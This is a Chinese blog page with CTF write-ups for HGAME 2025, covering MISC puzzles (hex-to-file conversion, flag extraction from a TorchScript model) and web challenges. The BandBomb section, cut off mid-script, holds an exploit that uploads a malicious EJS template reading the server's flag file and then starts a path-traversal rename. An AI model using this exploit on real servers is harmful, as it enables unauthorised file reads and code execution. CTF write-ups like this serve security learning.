<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HGAME CTF 2025 Week1 + Week2 wp | Matriy's blog</title><meta name="author" content="Matriy"><meta name="copyright" content="Matriy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="HGAME CTFMISCHakuya Want A Girl Friend12345678910111213141516171819202122232425def hex_to_bytes(hex_str):    # 将十六进制字符串转化为字节序列    hex_values &#x3D; hex_str.split()  # 按空格分隔    byte_array &#x3D; bytes(int(value,">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME CTF 2025 Week1 + Week2 wp">
<meta property="og:url" content="http://matriy330.github.io/f2342e51/index.html">
<meta property="og:site_name" content="Matriy&#39;s blog">
<meta property="og:description" content="HGAME CTFMISCHakuya Want A Girl Friend12345678910111213141516171819202122232425def hex_to_bytes(hex_str):    # 将十六进制字符串转化为字节序列    hex_values &#x3D; hex_str.split()  # 按空格分隔    byte_array &#x3D; bytes(int(value,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/media.jpeg">
<meta property="article:published_time" content="2025-02-11T11:14:00.000Z">
<meta property="article:modified_time" content="2025-02-25T04:41:37.310Z">
<meta property="article:author" content="Matriy">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/media.jpeg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HGAME CTF 2025 Week1 + Week2 wp",
  "url": "http://matriy330.github.io/f2342e51/",
  "image": "https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/media.jpeg",
  "datePublished": "2025-02-11T11:14:00.000Z",
  "dateModified": "2025-02-25T04:41:37.310Z",
  "author": [
    {
      "@type": "Person",
      "name": "Matriy",
      "url": "http://matriy330.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="http://matriy330.github.io/f2342e51/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="G-ShTqjjywiLkL87Rg0PaiSsDVYymWStdQUO1wrM_VY"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":30,"languages":{"author":"作者: Matriy","link":"链接: ","source":"来源: Matriy's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}
</script><link rel="stylesheet" href="/css/custom.css"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HGAME CTF 2025 Week1 + Week2 wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/music.css"><link rel="stylesheet" href="/css/comment.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="an_music_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">198</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/media.jpeg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Matriy's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HGAME CTF 2025 Week1 + Week2 wp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HGAME CTF 2025 Week1 + Week2 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-11T11:14:00.000Z" title="发表于 2025-02-11 19:14:00">2025-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-25T04:41:37.310Z" title="更新于 2025-02-25 12:41:37">2025-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-wp/">CTF wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>50分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/f2342e51/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HGAME-CTF"><a href="#HGAME-CTF" class="headerlink" title="HGAME CTF"></a>HGAME CTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 将十六进制字符串转化为字节序列</span></span><br><span class="line">    hex_values = hex_str.split()  <span class="comment"># 按空格分隔</span></span><br><span class="line">    byte_array = <span class="built_in">bytes</span>(<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values)  <span class="comment"># 将每个16进制字符串转换为字节</span></span><br><span class="line">    <span class="comment"># byte_array = bytes(int(value, 16) for value in reversed(hex_values))  # 将每个16进制字符串转换为字节</span></span><br><span class="line">    <span class="built_in">print</span>(byte_array)</span><br><span class="line">    <span class="keyword">return</span> byte_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 读取输入文件中的16进制数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">        hex_str = infile.read().strip()  <span class="comment"># 读取文件并去掉两端的空白符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    byte_data = hex_to_bytes(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节数据写入输出文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(byte_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&quot;hky.txt&quot;</span>  <span class="comment"># 输入文件路径</span></span><br><span class="line">    output_filename = <span class="string">&quot;output.bin&quot;</span>  <span class="comment"># 输出文件路径</span></span><br><span class="line">    convert_file(input_filename, output_filename)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正着是个zip</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222131757594.png" alt="image-20250222131757594"></p>
<p>倒过来是个png</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222131642569.png" alt="image-20250222131642569"></p>
<p>改png：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222132347183.png" alt="image-20250222132347183"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222135230205.png" alt="image-20250222135230205"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222135758033.png" alt="image-20250222135758033"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222135807803.png" alt="image-20250222135807803"></p>
<p>To_f1nd_th3_QQ</p>
<p>hagme{h4kyu4_w4nt_gir1f3nd_+q_931290928}</p>
<p>我用winrar压不出来，只能用360压缩，还有这里的ag倒了</p>
<h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a>Level 314 线性走廊中的双生实体</h3><p>pt文件本质上也是压缩包，打开可以看到源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line">  __parameters__ = []</span><br><span class="line">  __buffers__ = []</span><br><span class="line">  training : <span class="built_in">bool</span></span><br><span class="line">  _is_full_backward_hook : <span class="type">Optional</span>[<span class="built_in">bool</span>]</span><br><span class="line">  linear1 : __torch__.torch.nn.modules.linear.Linear</span><br><span class="line">  security : __torch__.SecurityLayer</span><br><span class="line">  relu : __torch__.torch.nn.modules.activation.ReLU</span><br><span class="line">  linear2 : __torch__.torch.nn.modules.linear.___torch_mangle_0.Linear</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self: __torch__.MyModel,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">    linear1 = <span class="variable language_">self</span>.linear1</span><br><span class="line">    x0 = (linear1).forward(x, )</span><br><span class="line">    security = <span class="variable language_">self</span>.security</span><br><span class="line">    x1 = (security).forward(x0, )</span><br><span class="line">    relu = <span class="variable language_">self</span>.relu</span><br><span class="line">    x2 = (relu).forward(x1, )</span><br><span class="line">    linear2 = <span class="variable language_">self</span>.linear2</span><br><span class="line">    <span class="keyword">return</span> (linear2).forward(x2, )</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecurityLayer</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line">  __parameters__ = []</span><br><span class="line">  __buffers__ = []</span><br><span class="line">  training : <span class="built_in">bool</span></span><br><span class="line">  _is_full_backward_hook : <span class="type">Optional</span>[<span class="built_in">bool</span>]</span><br><span class="line">  flag : <span class="type">List</span>[<span class="built_in">int</span>]</span><br><span class="line">  fake_flag : <span class="type">List</span>[<span class="built_in">int</span>]</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self: __torch__.SecurityLayer,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">    _0 = torch.allclose(torch.mean(x), torch.tensor(<span class="number">0.31415000000000004</span>), <span class="number">1.0000000000000001e-05</span>, <span class="number">0.0001</span>)</span><br><span class="line">    <span class="keyword">if</span> _0:</span><br><span class="line">      _1 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">      flag = <span class="variable language_">self</span>.flag</span><br><span class="line">      <span class="keyword">for</span> _2 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(flag)):</span><br><span class="line">        b = flag[_2]</span><br><span class="line">        _3 = torch.append(_1, torch.<span class="built_in">chr</span>(torch.__xor__(b, <span class="number">85</span>)))</span><br><span class="line">      decoded = torch.join(<span class="string">&quot;&quot;</span>, _1)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Hidden:&quot;</span>, decoded)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bool</span>(torch.gt(torch.mean(x), <span class="number">0.5</span>)):</span><br><span class="line">      _4 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">      fake_flag = <span class="variable language_">self</span>.fake_flag</span><br><span class="line">      <span class="keyword">for</span> _5 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(fake_flag)):</span><br><span class="line">        c = fake_flag[_5]</span><br><span class="line">        _6 = torch.append(_4, torch.<span class="built_in">chr</span>(torch.sub(c, <span class="number">3</span>)))</span><br><span class="line">      decoded0 = torch.join(<span class="string">&quot;&quot;</span>, _4)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Decoy:&quot;</span>, decoded0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接访问security：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">model = torch.jit.load(<span class="string">&quot;entity.pt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> model.security.flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="number">85</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{s0_th1s_1s_r3al_s3cr3t}</p>
<h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222165706555.png" alt="image-20250222165706555"></p>
<p>hgame{y0u_</p>
<p>看日志</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222165854457.png" alt="image-20250222165854457"></p>
<p>_c0mput3r!}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222170449868.png" alt="image-20250222170449868"></p>
<p>日志中的IP访问即可</p>
<p>hgame{y0u_hav3_cleaned_th3_c0mput3r!}</p>
<h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a>Computer cleaner plus</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224122156925.png" alt="image-20250224122156925"></p>
<p>hgame{B4ck_D0_oR}</p>
<h3 id="Level-729-易画行"><a href="#Level-729-易画行" class="headerlink" title="Level 729 易画行"></a>Level 729 易画行</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224124859159.png" alt="image-20250224124859159"></p>
<p>根据给的网站和16进制慢慢找即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224124831872.png" alt="image-20250224124831872"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224124812720.png" alt="image-20250224124812720"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>游戏玩玩发现gift</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250209202353311.png" alt="image-20250209202353311"></p>
<p>分别Base64解出来不成样子，猜测栅栏加密过了，因为里面含有hagme，pacman等信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250209202138523.png" alt="image-20250209202138523"></p>
<h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>deepseek一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://node1.hgame.vidar.club:31545&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 上传恶意模板文件</span></span><br><span class="line">malicious_file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;exploit.ejs&quot;</span>, <span class="string">&quot;&lt;%= process.env.FLAG || fs.readFileSync(&#x27;/flag&#x27;) %&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 上传恶意模板...&quot;</span>)</span><br><span class="line">upload_res = requests.post(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/upload&quot;</span>, files=malicious_file)</span><br><span class="line"><span class="keyword">if</span> upload_res.json().get(<span class="string">&quot;message&quot;</span>) != <span class="string">&quot;文件上传成功&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 上传失败:&quot;</span>, upload_res.text)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 上传成功，文件名:&quot;</span>, upload_res.json()[<span class="string">&quot;filename&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 重命名为模板路径（路径穿越）</span></span><br><span class="line"><span 